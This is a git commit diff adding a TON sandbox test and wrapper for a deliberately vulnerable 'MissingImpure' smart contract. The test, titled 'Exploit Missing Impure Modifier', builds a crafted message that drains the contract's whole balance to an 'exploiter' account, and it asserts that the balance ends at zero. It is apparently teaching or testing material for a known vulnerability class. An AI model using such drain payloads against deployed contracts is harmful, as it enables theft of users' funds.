bab1d2368dcf62feaf4289a9c73aa5de93462a0f
Nikhil Gupta <177606878+BitByNIK@users.noreply.github.com>
2025-04-23 11:38:23 +0530

    completed code and tests for missing impure modifier vul

--- VSCs Dev Env/tests/MissingImpure.spec.ts
+++ VSCs Dev Env/tests/MissingImpure.spec.ts
@@ -1,5 +1,5 @@
 import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
-import { Cell, toNano } from '@ton/core';
+import { beginCell, Cell, toNano } from '@ton/core';
 import { MissingImpure } from '../wrappers/MissingImpure';
 import '@ton/test-utils';
 import { compile } from '@ton/blueprint';
@@ -12,28 +12,65 @@ describe('MissingImpure', () => {
     });
 
     let blockchain: Blockchain;
-    let deployer: SandboxContract<TreasuryContract>;
+    let owner1: SandboxContract<TreasuryContract>;
+    let owner2: SandboxContract<TreasuryContract>;
+    let exploiter: SandboxContract<TreasuryContract>;
     let missingImpure: SandboxContract<MissingImpure>;
+    let initBalance: bigint;
 
     beforeEach(async () => {
+        initBalance = toNano('100');
         blockchain = await Blockchain.create();
 
-        missingImpure = blockchain.openContract(MissingImpure.createFromConfig({}, code));
+        owner1 = await blockchain.treasury('owner1');
+        owner2 = await blockchain.treasury('owner2');
+        exploiter = await blockchain.treasury('exploiter');
 
-        deployer = await blockchain.treasury('deployer');
+        missingImpure = blockchain.openContract(
+            MissingImpure.createFromConfig({ owner1: owner1.address, owner2: owner2.address }, code),
+        );
 
-        const deployResult = await missingImpure.sendDeploy(deployer.getSender(), toNano('0.05'));
+        const deployResult = await missingImpure.sendDeploy(owner1.getSender(), initBalance);
 
         expect(deployResult.transactions).toHaveTransaction({
-            from: deployer.address,
+            from: owner1.address,
             to: missingImpure.address,
             deploy: true,
             success: true,
         });
     });
 
-    it('should deploy', async () => {
-        // the check is done inside beforeEach
-        // blockchain and missingImpure are ready to use
+    it('Exploit Missing Impure Modifier', async () => {
+        expect((await missingImpure.getBalance()) > 0n).toBe(true);
+        console.log('MissingImpure balance before:', (await missingImpure.getBalance()).toString());
+
+        const balanceExploiterBefore = await exploiter.getBalance();
+        console.log('Exploiter balance before:', balanceExploiterBefore.toString());
+
+        const body = beginCell()
+            .storeRef(
+                beginCell()
+                    .storeRef(Cell.EMPTY)
+                    .storeUint(0x0ec3c86d, 32)
+                    .storeUint(128, 8)
+                    .storeRef(
+                        beginCell()
+                            .storeUint(0x18, 6)
+                            .storeAddress(exploiter.address)
+                            .storeCoins(0)
+                            .storeUint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
+                            .endCell(),
+                    ),
+            )
+            .endCell();
+
+        await missingImpure.sendMessage(exploiter.getSender(), toNano('0.05'), body);
+
+        const balanceExploiterAfter = await exploiter.getBalance();
+        console.log('Exploiter balance after:', balanceExploiterAfter.toString());
+
+        expect((await missingImpure.getBalance()) == 0n).toBe(true);
+        console.log('MissingImpure balance after:', (await missingImpure.getBalance()).toString());
+        expect(initBalance > balanceExploiterAfter - balanceExploiterBefore).toBe(true);
     });
 });
--- VSCs Dev Env/wrappers/MissingImpure.ts
+++ VSCs Dev Env/wrappers/MissingImpure.ts
@@ -1,13 +1,19 @@
 import { Address, beginCell, Cell, Contract, contractAddress, ContractProvider, Sender, SendMode } from '@ton/core';
 
-export type MissingImpureConfig = {};
+export type MissingImpureConfig = {
+    owner1: Address;
+    owner2: Address;
+};
 
 export function missingImpureConfigToCell(config: MissingImpureConfig): Cell {
-    return beginCell().endCell();
+    return beginCell().storeAddress(config.owner1).storeAddress(config.owner2).endCell();
 }
 
 export class MissingImpure implements Contract {
-    constructor(readonly address: Address, readonly init?: { code: Cell; data: Cell }) {}
+    constructor(
+        readonly address: Address,
+        readonly init?: { code: Cell; data: Cell },
+    ) {}
 
     static createFromAddress(address: Address) {
         return new MissingImpure(address);
@@ -23,7 +29,30 @@ export class MissingImpure implements Contract {
         await provider.internal(via, {
             value,
             sendMode: SendMode.PAY_GAS_SEPARATELY,
-            body: beginCell().endCell(),
+            body: Cell.EMPTY,
         });
+    }
+
+    async sendMessage(provider: ContractProvider, via: Sender, value: bigint, body: Cell) {
+        await provider.internal(via, {
+            value,
+            sendMode: SendMode.PAY_GAS_SEPARATELY,
+            body: body,
+        });
+    }
+
+    async getOwner1(provider: ContractProvider) {
+        const result = await provider.get('owner1', []);
+        return result.stack.readAddress();
+    }
+
+    async getOwner2(provider: ContractProvider) {
+        const result = await provider.get('owner2', []);
+        return result.stack.readAddress();
+    }
+
+    async getBalance(provider: ContractProvider) {
+        const result = await provider.get('balance', []);
+        return result.stack.readBigNumber();
     }
 }
